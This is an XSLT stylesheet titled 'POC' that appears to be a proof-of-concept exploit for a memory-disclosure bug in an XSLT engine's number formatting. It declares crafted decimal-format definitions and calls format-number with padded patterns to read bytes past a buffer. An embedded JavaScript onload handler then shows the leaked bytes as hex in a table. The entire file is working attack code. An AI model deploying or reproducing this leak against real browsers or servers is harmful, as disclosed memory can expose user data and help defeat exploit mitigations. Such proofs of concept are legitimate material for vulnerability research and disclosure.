<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:output indent="yes"/>

<xsl:decimal-format name="1"  digit="&#x20;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="2"  digit="&#x28;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="3"  digit="&#x30;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="4"  digit="&#x38;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="5"  digit="&#x40;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="6"  digit="&#x48;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="7"  digit="&#x50;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="8"  digit="&#x58;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="9"  digit="&#x60;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="10" digit="&#x68;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="11" digit="&#x70;" decimal-separator="" zero-digit="a"/>
<xsl:decimal-format name="12" digit="&#x78;" decimal-separator="" zero-digit="a"/>

<!-- 200 characters. -->
<xsl:variable name="buf" select="'cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc'"/>

<xsl:template match="/">
    <html>
        <head>
            <title>POC</title>
            <style type="text/css">table { border-collapse: collapse; } td, th { border: 1px solid black; }</style>
            <script type="text/javascript">
<![CDATA[
function convertToHex() {
    var byteToHex = function(v) {
        var hex = v.toString(16);
        if (hex.length < 2) { hex = '0' + hex; }
        return hex;
    }

    var rows = document.querySelectorAll('tr');

    for (var i = 1; i < rows.length; i++) {
        var cells = rows[i].querySelectorAll('td');

        var bytes = unescape(cells[2].querySelector('a').name);
        var hex = '';
        for (var j = 1; j < bytes.length - 1; j++) {
            hex += byteToHex(bytes.charCodeAt(j)) + ' ';
        }
        cells[2].textContent = hex;

        cells[1].textContent = byteToHex(parseInt(cells[1].textContent));
    }
}
]]>
            </script>
        </head>
        <body onload="convertToHex();">
            <table>
                <tr>
                    <th>Pattern size</th>
                    <th>Guessed first byte</th>
                    <th>Other bytes</th>
                </tr>
                <xsl:apply-templates select="doc/i"/>
            </table>
        </body>
    </html>
</xsl:template>

<xsl:template match="i">
    <xsl:apply-templates select="/doc/j"/>
</xsl:template>

<xsl:template match="j">
    <xsl:apply-templates select="/doc/k"/>
</xsl:template>

<xsl:template match="k">
    <xsl:variable name="size" select="position() * 4"/>
    <xsl:variable name="pattern" select="concat(substring($buf, 1, $size - 2), 'a')"/>
    <xsl:apply-templates select="/doc/f">
        <xsl:with-param name="size" select="$size"/>
        <xsl:with-param name="pattern" select="$pattern"/>
    </xsl:apply-templates>
</xsl:template>

<xsl:template match="f">
    <xsl:param name="size"/>
    <xsl:param name="pattern"/>

    <xsl:variable name="format-name" select="string(position())"/>
    <xsl:variable name="bytes" select="substring-after(format-number(0, $pattern, $format-name), $pattern)"/>

    <xsl:if test="$bytes">
        <tr>
            <td>
                <xsl:value-of select="$size"/>
            </td>
            <td>
                <xsl:value-of select="24 + position() * 8"/>
            </td>
            <td>
                <a name="-{$bytes}-"/>
            </td>
        </tr>
    </xsl:if>
</xsl:template>

</xsl:stylesheet>
